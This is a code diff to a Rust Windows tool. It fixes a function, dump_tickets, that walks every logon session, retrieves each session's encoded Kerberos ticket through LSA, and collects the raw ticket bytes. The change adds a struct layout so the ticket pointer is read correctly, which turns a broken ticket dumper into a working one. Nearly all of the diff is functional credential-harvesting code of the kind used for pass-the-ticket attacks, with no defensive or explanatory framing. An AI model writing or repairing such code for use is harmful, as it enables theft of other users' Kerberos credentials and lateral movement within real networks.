@@ -139,20 +139,46 @@ pub fn dump_tickets(luid: Option<u64>) -> Result<Vec<Vec<u8>>> {
         creds_handle_high: u64,
     }
 
+    // KERB_RETRIEVE_TKT_RESPONSE begins with KERB_EXTERNAL_TICKET whose
+    // EncodedTicket field is a *pointer* into the same buffer, not inline bytes.
+    // Mirror the 64-bit layout to reach the pointer fields.
+    #[repr(C)]
+    struct KerbExternalTicketLayout {
+        _svc_name:           *const u8,  // +0
+        _target_name:        *const u8,  // +8
+        _client_name:        *const u8,  // +16
+        _domain_name:        [u8; 16],   // +24 UNICODE_STRING
+        _target_domain:      [u8; 16],   // +40
+        _alt_domain:         [u8; 16],   // +56
+        _session_key_type:   i32,        // +72
+        _session_key_len:    u32,        // +76
+        _session_key_ptr:    *const u8,  // +80
+        _ticket_flags:       u32,        // +88
+        _flags:              u32,        // +92
+        _key_expiry:         i64,        // +96
+        _start_time:         i64,        // +104
+        _end_time:           i64,        // +112
+        _renew_until:        i64,        // +120
+        _time_skew:          i64,        // +128
+        encoded_ticket_size: u32,        // +136
+        _pad:                u32,        // +140
+        encoded_ticket:      *const u8,  // +144
+    }
+
     let mut tickets = Vec::new();
     let target_name: Vec<u16> = Vec::new();
 
     unsafe {
         for i in 0..session_count as usize {
-            let luid = *session_list.add(i);
+            let session_luid = *session_list.add(i);
             if let Some(filter) = luid {
-                let luid_val = (luid.HighPart as u64) << 32 | luid.LowPart as u64;
+                let luid_val = (session_luid.HighPart as u64) << 32 | session_luid.LowPart as u64;
                 if luid_val != filter { continue; }
             }
             let req = RetrieveReq {
                 msg_type: 4, // KerbRetrieveEncodedTicketMessage
-                luid_low: luid.LowPart,
-                luid_high: luid.HighPart,
+                luid_low: session_luid.LowPart,
+                luid_high: session_luid.HighPart,
                 target_len: 0,
                 target_maxlen: 0,
                 _pad: 0,
@@ -174,11 +200,13 @@ pub fn dump_tickets(luid: Option<u64>) -> Result<Vec<Vec<u8>>> {
                 Some(&mut resp_buf), Some(&mut resp_len), Some(&mut sub_status),
             );
             if result.is_ok() && !resp_buf.is_null() && sub_status == 0 {
-                // Response is KERB_RETRIEVE_TKT_RESPONSE: msg_type(4) + Ticket bytes
-                // The encoded ticket starts after msg_type
-                let ptr = resp_buf as *const u8;
-                if resp_len > 8 {
-                    let tkt_bytes = std::slice::from_raw_parts(ptr.add(4), resp_len as usize - 4);
+                // Response buffer is KERB_RETRIEVE_TKT_RESPONSE (= KERB_EXTERNAL_TICKET).
+                // EncodedTicket is a pointer into the same allocation; dereference it.
+                let ext = &*(resp_buf as *const KerbExternalTicketLayout);
+                let tkt_size = ext.encoded_ticket_size as usize;
+                let tkt_ptr = ext.encoded_ticket;
+                if !tkt_ptr.is_null() && tkt_size > 0 {
+                    let tkt_bytes = std::slice::from_raw_parts(tkt_ptr, tkt_size);
                     tickets.push(tkt_bytes.to_vec());
                 }
                 let _ = LsaFreeReturnBuffer(resp_buf);
